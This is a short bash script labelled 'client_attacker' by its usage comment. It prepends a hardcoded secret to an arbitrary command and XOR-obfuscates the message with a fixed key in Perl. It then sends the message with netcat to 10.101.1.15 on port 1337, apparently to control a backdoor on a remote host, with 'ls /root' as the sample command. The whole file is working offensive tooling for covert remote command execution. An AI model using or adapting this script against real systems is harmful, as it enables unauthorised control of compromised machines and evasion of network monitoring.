#!/bin/bash

#USE ./client_attacker "date && ls  /root"
KEY="myxor"
SECRET="sesame:street"
CMD="$@"

PLAIN="$SECRET $CMD"

perl -e '
  my $key = shift;
  my $msg = shift;
  for (my $i = 0; $i < length($msg); $i++) {
    print chr(ord(substr($msg, $i, 1)) ^ ord(substr($key, $i % length($key), 1)));
  }
' "$KEY" "$PLAIN" | nc 10.101.1.15 1337
